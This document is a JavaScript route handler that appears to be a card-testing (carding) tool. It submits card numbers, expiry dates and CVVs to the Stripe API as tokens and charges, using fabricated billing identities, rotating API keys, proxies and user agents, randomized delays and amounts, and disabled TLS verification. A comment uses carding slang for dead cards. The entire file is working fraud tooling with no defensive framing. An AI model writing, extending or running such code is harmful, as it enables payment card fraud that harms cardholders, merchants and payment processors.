const request = require('request-promise')
const { config, logPort } = require("../config.js")

let $g = global,
    $h = $g.$h;

module.exports = {
    
    '/fastCheckout': {
        
        method: 'post',

        async handler (req, res) {

            console.log('   ...runing /fastCheckout', '\n')

            let $info = req.body,
                $cus = $g.genBicoData()

            console.log('   $info:', $info)
            console.log('   $cus:', $cus, '\n')

            const $skeys = $g.pickOneSkey('both'),
                  $uaClient = $g.pickOneUA('front'),
                  $uaServer = $g.pickOneUA('server'),
                  $pxUsual = $g.pickOneProxy('usual'),
                  $pxServer = $g.pickOneProxy('server');

            // main piece
            let $tk = await resolveToken();

            if ($tk) {
            
                let $ch = await resolveCharge($tk);

                if ($ch) {
                    res.status(200)
                        .send($ch)
                            .end()
                } else {

                    // handle chance de $flv

                    res.status(500)
                        .send({error: 'no charge'})
                            .end()
                }
            
            } else {
                
                // 95% full die
                res.status(500)
                    .send({error: 'no token'})
                        .end()
            }

            // down methods declared
            async function resolveToken () {
                
                try {

                    console.log('   ...issuing Token.')

                    await $h.delayRandom('  ...delay a bit before create Token...', {
                        min: 3000, 
                        max: 600
                    })

                    let token = await issueToken({
                        'card[number]': $info.number,
                        'card[exp_month]': $info.month,
                        'card[exp_year]': $info.year,
                        'card[cvc]': $info.cvv,
                        'card[name]': $cus.holdername,
                        'card[address_line1]': $cus.address,
                        'card[address_state]': $cus.state,
                        'card[address_zip]': $cus.cep,
                        'card[address_country]': $cus.country
                    })

                    console.log('   ...Token issued:', token)
                    console.log('   ...typeof token:', typeof token, '\n')

                    return JSON.parse(token);

                } catch (err) {
                    
                    console.log('   * Fail at issueToken()')
                    console.error(JSON.parse(err))

                    return null;
                }
            }
            
            async function resolveCharge (tk) {

                try {

                    console.log('   ...issuing Charge.')

                    await $h.delayRandom('  ...delay a bit before create Charge...', {
                        min: 3000, 
                        max: 600
                    })

                    let charge = await issueCharge({
                        source: tk.id,
                        currency: 'brl',
                        amount: $h.getRandomAmount({min: 59, max: 119}),
                        description: $h.getRandomDescription(),
                        receipt_email: $cus.email,
                        metadata: {
                            email: $cus.email,
                            holdername: $cus.holdername
                        },
                        shipping: {
                            name: $cus.name,
                            address: {
                                city: $cus.city,
                                line1: $cus.address,
                                state: $cus.state,
                                postal_code: $cus.cep,
                                country: $cus.country
                            }
                        }
                    })

                    console.log('   ...Charge issued:', charge, '\n')

                    return JSON.parse(charge)

                } catch (err) {
                    
                    console.log('   * Fail at resolveCharge()')
                    console.error(JSON.parse(err))

                    return null;
                }
            }

            async function issueToken (tokenData) {
                
                // MyClient > Stripe setup request
                let $res = await request({
                    url: config.apiUrl + '/tokens',
                    method: 'post',
                    rejectUnauthorized: false,
                    qs: tokenData,
                    proxy: $pxUsual,
                    headers: {
                        'Keep-Alive': 'true',
                        'User-Agent': $uaClient,
                        'Authorization': 'Bearer ' + $skeys.pk
                    }
                })

                return $res;
            }

            async function issueCharge (chargeData) {

                // Server -> Stripe setup request
                let $res = request({
                    url: config.apiUrl + '/charges',
                    method: 'post',
                    rejectUnauthorized: false,
                    qs: chargeData,
                    data: chargeData,
                    proxy: $pxServer,
                    headers: {
                        'Keep-Alive': 'true',
                        'User-Agent': $uaServer,
                        'Authorization': 'Bearer ' + $skeys.sk
                    }
                })

                return $res;
            }
        }
    }
}